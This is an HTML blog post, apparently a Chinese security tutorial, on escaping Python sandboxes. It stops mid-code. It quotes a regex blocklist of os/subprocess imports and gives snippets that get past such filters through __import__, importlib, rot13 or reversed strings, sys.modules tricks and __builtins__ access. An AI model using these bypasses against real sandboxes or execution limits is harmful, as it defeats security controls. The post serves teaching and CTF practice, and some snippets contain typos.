@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="阿巴">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/08/20/paython沙箱逃逸/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="python沙箱逃逸沙箱简介沙箱（sandbox）是计算机安全领域中的一个概念，它指的是一种隔离和限制软件运行环境的机制。沙箱将应用程序或进程限定在一个受控的环境中，以防止其对系统或其他应用程序造成损害。 具体来说，沙箱提供了一个虚拟的、隔离的环境，其中应用程序可以运行而不会对主机系统产生直接影响。这种隔离环境通常模拟了真实操作系统的部分功能，但是在其内部运行的应用程序会受到限制，不能访问或修">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸">
+<meta property="og:url" content="http://example.com/2023/08/20/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="阿巴">
+<meta property="og:description" content="python沙箱逃逸沙箱简介沙箱（sandbox）是计算机安全领域中的一个概念，它指的是一种隔离和限制软件运行环境的机制。沙箱将应用程序或进程限定在一个受控的环境中，以防止其对系统或其他应用程序造成损害。 具体来说，沙箱提供了一个虚拟的、隔离的环境，其中应用程序可以运行而不会对主机系统产生直接影响。这种隔离环境通常模拟了真实操作系统的部分功能，但是在其内部运行的应用程序会受到限制，不能访问或修">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/source/images/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/python2builtins.png">
+<meta property="og:image" content="http://example.com/source/images/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/python3builtins%20.png">
+<meta property="article:published_time" content="2023-08-20T01:50:17.000Z">
+<meta property="article:modified_time" content="2023-08-20T01:50:40.603Z">
+<meta property="article:author" content="阿巴">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/source/images/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/python2builtins.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/8d.png@1256w_1256h_!web-article-pic.webp" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <!--- Page Info-->
+    
+    <title>
+        
+            python沙箱逃逸 -
+        
+        阿巴
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/e6d1c777bb54674dd5cc6ed2c6147596a899ed7b.jpg@1256w_708h_!web-article-pic.webp","dark":"/images/688bff5fab134b2da7d52ca53163372d39812ec8.jpg@1256w_708h_!web-article-pic.webp"},"title":"阿巴的小站","subtitle":{"text":[],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/621779","instagram":"https://www.instagram.com/","zhihu":"https://www.zhihu.com/people/zhi-chu-85-7","twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"如果讨厌当前的处境，那就不惜一切代价上去，然后去追随梦想吧！","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/11  12：00：00"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                阿巴
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                
+                  <h1 class="article-title-regular">python沙箱逃逸</h1>
+                
+              </div>
+              
+                     
+            
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/49871906.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">阿巴</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-20 09:50:17</span>
+        <span class="mobile">2023-08-20 09:50:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-08-20 09:50:40</span>
+            <span class="mobile">2023-08-20 09:50:40</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <span id="more"></span>
+
+<h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>沙箱（sandbox）是计算机安全领域中的一个概念，它指的是一种隔离和限制软件运行环境的机制。沙箱将应用程序或进程限定在一个受控的环境中，以防止其对系统或其他应用程序造成损害。</p>
+<p>具体来说，沙箱提供了一个虚拟的、隔离的环境，其中应用程序可以运行而不会对主机系统产生直接影响。这种隔离环境通常模拟了真实操作系统的部分功能，但是在其内部运行的应用程序会受到限制，不能访问或修改主机系统的重要文件或配置。</p>
+<p>最初的浏览器沙箱是基于Hook实现的，后来的Chrome沙箱是利用操作系统提供的一些安全机制实现的。</p>
+<p>沙箱很多情况下都是实现在虚拟机（VM）中，比如Java的虚拟机JVM、Javascript的虚拟机V8引擎、Android中的虚拟机Dalvik&#x2F;ART，以及以太坊的虚拟机EVM等等。具体的实现方式各有不同，本文重点分析一下JVM和EVM的沙箱机制实现。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>沙箱的原理简单讲就是建立一个受限的环境，将运行的应用程序或进程隔离在其中，防止其对主机系统造成损坏，以下为一般沙箱工作原理：</p>
+<ol>
+<li><p>隔离环境：</p>
+<p>沙箱创建沙箱创建一个隔离的运行环境，该环境仅允许应用程序在其中执行，并与主机系统或其他应用程序隔离开。这个隔离环境可以是软件实现的虚拟运行环境，也可以是硬件实现的虚拟机或容器。</p>
+</li>
+<li><p>限制资源访问：</p>
+<p>沙箱限制应用程序对系统资源的访问权限，例如文件系统、网络连接、系统配置等。这样可以防止应用程序对敏感文件或系统重要功能进行修改或篡改。</p>
+</li>
+<li><p>模拟操作系统功能：</p>
+<p>沙箱在隔离环境中模拟操作系统的部分功能，以使应用程序可以在类似实际操作系统的环境中运行。这样可以提供一种沙箱内部的假象，使应用程序无法意识到自己被隔离在一个受限制的环境中。</p>
+</li>
+<li><p>监控和记录：</p>
+<p>沙箱监控应用程序在隔离环境中的行为，并记录其对系统资源的访问和操作。这样可以对应用程序的行为进行审计和分析，以便及时检测到任何异常或恶意活动。</p>
+</li>
+<li><p>安全策略和控制：</p>
+<p>沙箱根据预定义的安全策略和控制规则，对应用程序的行为进行限制和控制。这些策略包括访问权限、网络通信控制、系统调用过滤等，以确保应用程序只能在沙箱的规定范围内运行。</p>
+</li>
+</ol>
+<h2 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h2><p>沙箱逃逸（sandbox escape）是指试图绕过沙箱机制，从被限制的环境中逃出，并获取对主机系统或其他受限资源的访问权限。沙箱逃逸可能是由于沙箱实现的漏洞或错误，或者是攻击者发现了沙箱中的弱点或漏洞，利用它们来获得更高的权限或执行恶意代码。</p>
+<h3 id="基础python知识"><a href="#基础python知识" class="headerlink" title="基础python知识"></a>基础python知识</h3><p>python中可以执行系统命令的方式有如下：</p>
+<ol>
+<li><p>os模块</p>
+<ul>
+<li><p>os.system(cmd)<br>在子终端运行系统命令，不能获取命令执行后的返回信息及执行返回的状态</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span>
+<span class="token comment"># 2016年 06月 30日 星期四 19:26:21 CST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>os.popen(cmd)<br>不仅执行命令而且返回执行后的信息对象(常用于需要获取执行命令后的返回信息)</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+nowtime <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> nowtime<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># 2016年 06月 30日 星期四 19:26:21 CST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li><p>commands模块</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>getoutput</td>
+<td>获取执行命令后的返回信息</td>
+</tr>
+<tr>
+<td>getstatus</td>
+<td>获取执行命令的状态值(执行命令成功返回数值0，否则返回非0)</td>
+</tr>
+<tr>
+<td>getstatusoutput</td>
+<td>获取执行命令的状态值以及返回信息</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> commonds
+status<span class="token punctuation">,</span> output <span class="token operator">=</span> commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> status    <span class="token comment"># 0</span>
+<span class="token keyword">print</span> output    <span class="token comment"># 2016年 06月 30日 星期四 19:26:21 CST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意(该种方法只适用与python2)</p>
+</li>
+<li><p>subprocess模块<br>运用对线程的控制和监控，将返回的结果赋于一变量，便于程序的处理。官方文档：<a class="link"   target="_blank" rel="noopener" href="http://python.usyiyi.cn/python_278/library/subprocess.html" >http://python.usyiyi.cn/python_278/library/subprocess.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess
+nowtime <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span>
+<span class="token keyword">print</span> nowtime<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># 2016年 06月 30日 星期四 19:26:21 CST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<p>还有以下一些：</p>
+<pre class="line-numbers language-none"><code class="language-none">timeit：timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number&#x3D;1)
+
+platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode&#x3D;&#39;r&#39;, bufsize&#x3D;-1).read()
+
+pty：pty.spawn(&#39;ls&#39;)、pty.os
+
+bdb：bdb.os、cgi.sys
+
+cgi：cgi.os、cgi.sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="基础防御绕过"><a href="#基础防御绕过" class="headerlink" title="基础防御绕过"></a>基础防御绕过</h3><h4 id="禁止引入敏感包绕过"><a href="#禁止引入敏感包绕过" class="headerlink" title="禁止引入敏感包绕过"></a>禁止引入敏感包绕过</h4><p>在防御中，最常见就是对执行的代码进行检查，当存在敏感包时，便禁止其执行</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+code <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'code.py'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pattern  <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'import\s+(os|commands|subprocess|sys)'</span><span class="token punctuation">)</span>
+<span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>code<span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> <span class="token string">"forbidden module import detected"</span>
+    <span class="token keyword">raise</span> Exception<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如大佬的这段代码，就可以检测敏感包。</p>
+<p>但假如我们要执行系统命令，就得引入他所隔离的敏感包，下面是一些绕过方法：</p>
+<ol>
+<li><p><code>import os</code>：</p>
+<p>假如防御者只禁用了<code>import os</code>这个方法，那便没有影响因为，import后边的空格，接几个都能执行。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span>  os
+<span class="token keyword">import</span>   os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这些都能使用。</p>
+</li>
+<li><p><code>__import__</code>：<br>假如他禁用了额外的空格，这个方法也能使用，如<code>__import__(&#39;os&#39;)</code>，一样可以加载这个包。</p>
+</li>
+<li><p>importlib库：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p>
+</li>
+<li><p>直接导入本地库：import的原理是执行一遍导入的库，如果我们知道本地库的位置，那我们便可以直接导入本地库，不需要使用import。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">execfile</span><span class="token punctuation">(</span><span class="token string">'/usr/lib/python2.7/os.py'</span><span class="token punctuation">)</span>
+system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
+<span class="token comment">#2.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/usr/lib/python3.6/os.py'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    <span class="token keyword">exec</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
+<span class="token comment">#2.x/3.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在大多数的unix系统环境下，模块的路径都是<code>/usr/lib/pythonx.x/os.py</code></p>
+<p>如果sys还能使用的话，可以查看环境变量来查询位置：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
+<span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ol>
+<h4 id="危险字符串绕过"><a href="#危险字符串绕过" class="headerlink" title="危险字符串绕过"></a>危险字符串绕过</h4><p>在实际情况中，沙箱中会禁止一些危险的字符串，像os、eval之类的，但是可以通过花式处理字符串的方法，例如逆序、变量拼接、base64、hex、rot13…等等。</p>
+<p>import 是一个关键字,因此,包的名字是直接以 ‘tag’(标记)的方式引入的,但是对于函数和包来说,引入的包的名字就是他们的参数,也就是说,将会以字符串的方式引入。</p>
+<ul>
+<li><p>以<code>__import__</code>函数为例：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">black <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"pbzznaqf"</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'rot_13'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> black<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">)</span>
+<span class="token comment">#commands-->pbzznaqf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>或者使用importlib。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> importlib
+black <span class="token operator">=</span> importlib<span class="token punctuation">.</span>import_module<span class="token punctuation">(</span><span class="token string">"pbzznaqf"</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'rot_13'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> black<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>逆序</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'so'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>exec和eval</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">')"imaohw"(metsys.)"so"(__tropmi__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">')"imaohw"(metsys.so ;so tropmi'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+<h4 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h4><p>sys.modules其实是一个字典，里面存储了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如<code>os</code>是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。所以当防御者将os从sys.modules中移除时，os就没法用了。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'not allowed'</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os
+<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
+Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
+AttributeError<span class="token punctuation">:</span> <span class="token string">'str'</span> <span class="token builtin">object</span> has no attribute <span class="token string">'system'</span>
+<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但我们可以利用import加载模块的特性，重新加载回来。</p>
+<pre class="line-numbers language-none"><code class="language-none">Python import 的步骤
+python 所有加载的模块信息都存放在 sys.modules 结构中，当 import 一个模块时，会按如下步骤来进行。
+如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。
+如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同时，当删掉了<code>sys.modules[&#39;os&#39;]</code>，会让 Python 重新加载一次 os。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'not allowed'</span> <span class="token comment"># oj 为你加的</span>
+<span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span>
+<span class="token keyword">import</span> os
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>还可以直接导入os模块。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> sys
+<span class="token operator">>></span><span class="token operator">></span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'/usr/lib/python3.9/os.py'</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>还有<code>__builtins__</code>的导入方法。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>lambdax<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('ls')"</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('ls')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="执行函数过滤"><a href="#执行函数过滤" class="headerlink" title="执行函数过滤"></a>执行函数过滤</h3><p>在实际情况中，有时会把system函数会被禁止，且即无法通过os.system执行系统命令，且system也无法通过处理字符串的方法来实现，所以要想其他的途径来解决这一问题。</p>
+<p>这时我们便可以通过其他命令执行函数来读取，在上面都有列出，只需用一个print讲运行结果输出即可。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen2<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>还可以通过getattr、getattribute拿到对象的方法、属性。</p>
+<p>这个函数接受两个参数,一个模组或者对象,第二个是一个字符串,该函数会在模组或者对象下面的域内搜索有没有对应的函数或者属性。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
